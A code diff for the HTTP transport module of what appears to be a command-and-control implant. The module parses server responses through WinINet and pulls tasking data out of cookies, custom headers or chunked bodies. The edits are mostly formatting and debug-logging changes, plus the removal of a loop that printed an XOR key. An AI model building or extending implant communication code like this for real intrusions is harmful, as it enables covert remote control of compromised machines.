@@ -651,11 +651,6 @@ auto DECLFN Transport::ProcessClientOutput(
     return TRUE;
 }
 
-//
-// ProcessServerOutput:
-// - RespData is OUTPUT (newly allocated, caller takes ownership)
-// - RespData->Ptr is NOT added to ObjectFree - caller must free it
-//
 auto DECLFN Transport::ProcessServerOutput(
     _In_ HTTP_CONTEXT*  Ctx,
     _In_ HANDLE         RequestHandle,
@@ -810,7 +805,6 @@ auto DECLFN Transport::ProcessServerOutput(
                                 
                                 SIZE_T ValueLen = ValueEnd - ValueStart;
                                 
-                                // Caller owns this memory
                                 CHAR* CookieData = (CHAR*)hAlloc( ValueLen + SAFETY_MARGIN );
                                 if ( !CookieData ) {
                                     if ( LineEnd ) *LineEnd = SavedChar;
@@ -828,6 +822,9 @@ auto DECLFN Transport::ProcessServerOutput(
                                 
                                 KhDbg("Cookie value extracted - Size: %zu, Value: %s", ValueLen, CookieData);
                                 Found = TRUE;
+                                
+                                if ( LineEnd ) *LineEnd = SavedChar;
+                                break;
                             }
                         }
                     }
@@ -886,7 +883,6 @@ auto DECLFN Transport::ProcessServerOutput(
                 
                 SIZE_T ValueLen = ValueEnd - ValueStart;
                 
-                // Caller owns this memory
                 CHAR* CookieData = (CHAR*)hAlloc( ValueLen + SAFETY_MARGIN );
                 if ( !CookieData ) {
                     hFree( SetCookieValue );
@@ -927,15 +923,16 @@ auto DECLFN Transport::ProcessServerOutput(
             }
             
             WCHAR* AllHeaders = (WCHAR*)hAlloc( BufferSize + SAFETY_MARGIN );
-            if ( ! AllHeaders ) {
+            if ( !AllHeaders ) {
                 return FALSE;
             }
             
             HeaderIndex = 0;
-            if ( ! Self->Wininet.HttpQueryInfoW(
+            if ( !Self->Wininet.HttpQueryInfoW(
                 RequestHandle, HTTP_QUERY_RAW_HEADERS_CRLF, AllHeaders, &BufferSize, &HeaderIndex
             )) {
                 hFree( AllHeaders );
+                KhDbg("Failed to query raw headers");
                 return FALSE;
             }
             
@@ -943,50 +940,50 @@ auto DECLFN Transport::ProcessServerOutput(
             BOOL   Found       = FALSE;
             
             WCHAR LowerHeaderName[256] = {0};
-            Str::CopyW(LowerHeaderName, (WCHAR*)ServerOut->Header.Ptr);
-            for (WCHAR* p = LowerHeaderName; *p; p++) {
-                if (*p >= L'A' && *p <= L'Z') {
+            Str::CopyW( LowerHeaderName, (WCHAR*)ServerOut->Header.Ptr );
+            for ( WCHAR* p = LowerHeaderName; *p; p++ ) {
+                if ( *p >= L'A' && *p <= L'Z' ) {
                     *p = *p + (L'a' - L'A');
                 }
             }
             
-            while (CurrentLine && *CurrentLine && !Found) {
+            while ( CurrentLine && *CurrentLine && !Found ) {
                 WCHAR* LineEnd = nullptr;
-                for (WCHAR* p = CurrentLine; *p; p++) {
-                    if (*p == L'\r' && *(p + 1) == L'\n') {
+                for ( WCHAR* p = CurrentLine; *p; p++ ) {
+                    if ( *p == L'\r' && *(p + 1) == L'\n' ) {
                         LineEnd = p;
                         break;
                     }
                 }
                 
                 WCHAR SavedChar = L'\0';
-                if (LineEnd) {
+                if ( LineEnd ) {
                     SavedChar = *LineEnd;
                     *LineEnd = L'\0';
                 }
                 
                 WCHAR* ColonPos = nullptr;
-                for (WCHAR* p = CurrentLine; *p; p++) {
-                    if (*p == L':') {
+                for ( WCHAR* p = CurrentLine; *p; p++ ) {
+                    if ( *p == L':' ) {
                         ColonPos = p;
                         break;
                     }
                 }
                 
-                if (ColonPos) {
+                if ( ColonPos ) {
                     *ColonPos = L'\0';
                     
                     WCHAR* CurrentHeaderName = CurrentLine;
                     WCHAR* CurrentHeaderValue = ColonPos + 1;
                     
-                    while (*CurrentHeaderValue == L' ') {
+                    while ( *CurrentHeaderValue == L' ' ) {
                         CurrentHeaderValue++;
                     }
                     
                     WCHAR LowerCurrentHeader[256] = {0};
-                    Str::CopyW(LowerCurrentHeader, CurrentHeaderName);
-                    for (WCHAR* p = LowerCurrentHeader; *p; p++) {
-                        if (*p >= L'A' && *p <= L'Z') {
+                    Str::CopyW( LowerCurrentHeader, CurrentHeaderName );
+                    for ( WCHAR* p = LowerCurrentHeader; *p; p++ ) {
+                        if ( *p >= L'A' && *p <= L'Z' ) {
                             *p = *p + (L'a' - L'A');
                         }
                     }
@@ -994,8 +991,8 @@ auto DECLFN Transport::ProcessServerOutput(
                     BOOL Match = TRUE;
                     WCHAR* p1 = LowerHeaderName;
                     WCHAR* p2 = LowerCurrentHeader;
-                    while (*p1 && *p2) {
-                        if (*p1 != *p2) {
+                    while ( *p1 && *p2 ) {
+                        if ( *p1 != *p2 ) {
                             Match = FALSE;
                             break;
                         }
@@ -1003,29 +1000,34 @@ auto DECLFN Transport::ProcessServerOutput(
                         p2++;
                     }
                     
-                    if (Match && *p1 == L'\0' && *p2 == L'\0') {
-                        SIZE_T WideLen = Str::LengthW(CurrentHeaderValue);
+                    if ( Match && *p1 == L'\0' && *p2 == L'\0' ) {
+                        SIZE_T WideLen = Str::LengthW( CurrentHeaderValue );
                         
                         SIZE_T AllocSize = (WideLen * 3) + SAFETY_MARGIN;
-                        // Caller owns this memory
-                        CHAR* HeaderValue = (CHAR*)hAlloc(AllocSize);
-                        if (!HeaderValue) {
+                        CHAR* HeaderValue = (CHAR*)hAlloc( AllocSize );
+                        if ( !HeaderValue ) {
                             *ColonPos = L':';
-                            if (LineEnd) *LineEnd = SavedChar;
+                            if ( LineEnd ) *LineEnd = SavedChar;
                             hFree( AllHeaders );
                             return FALSE;
                         }
                         
-                        SIZE_T ConvertedLen = Str::WCharToChar(HeaderValue, CurrentHeaderValue, AllocSize);
+                        SIZE_T ConvertedLen = Str::WCharToChar( HeaderValue, CurrentHeaderValue, AllocSize );
                         RespData->Size = ConvertedLen;
-                        RespData->Ptr = B_PTR(HeaderValue);
+                        RespData->Ptr = B_PTR( HeaderValue );
                         Found = TRUE;
+                        
+                        KhDbg("Header value extracted - Size: %zu", ConvertedLen);
+                        
+                        *ColonPos = L':';
+                        if ( LineEnd ) *LineEnd = SavedChar;
+                        break;
                     }
                     
                     *ColonPos = L':';
                 }
                 
-                if (LineEnd) {
+                if ( LineEnd ) {
                     *LineEnd = SavedChar;
                     CurrentLine = LineEnd + 2;
                 } else {
@@ -1054,7 +1056,6 @@ auto DECLFN Transport::ProcessServerOutput(
             );
             
             if ( Success && ContentLength > 0 ) {
-                // Caller owns this memory
                 RespData->Ptr = B_PTR( hAlloc( ContentLength + SAFETY_MARGIN ) );
                 if ( !RespData->Ptr ) {
                     return FALSE;
@@ -1073,16 +1074,14 @@ auto DECLFN Transport::ProcessServerOutput(
                 return TRUE;
             }
             
-            // Chunked reading
             PVOID TmpBuffer = PTR( hAlloc( BEG_BUFFER_LENGTH ) );
-            if ( ! TmpBuffer ) {
+            if ( !TmpBuffer ) {
                 return FALSE;
             }
             
             const SIZE_T MAX_RESPONSE_SIZE = 10 * 1024 * 1024;
             SIZE_T RespCapacity = BEG_BUFFER_LENGTH;
             
-            // Caller owns this memory
             RespData->Ptr = B_PTR( hAlloc( RespCapacity ) );
             if ( !RespData->Ptr ) {
                 hFree( TmpBuffer );
@@ -1130,6 +1129,7 @@ auto DECLFN Transport::ProcessServerOutput(
                 return FALSE;
             }
             
+            KhDbg("Body read (chunked) - %zu bytes", RespData->Size);
             return TRUE;
         }
         default:
@@ -1274,12 +1274,6 @@ auto DECLFN Transport::HttpSend(
     ULONG TotalRequestSize = 0;
 
     Ctx.Path = Endpoint->Path;
-
-    KhDbg("mask key");
-    
-    for ( int i=0;i<sizeof(Self->Crp->XorKey);i++ ){
-        KhDbg("%d", Self->Crp->XorKey[i]);
-    }
     
     if ( ! this->PrepareUrl( &Ctx, Callback, Secure ) ) {
         return CleanupHttpContext( &Ctx );
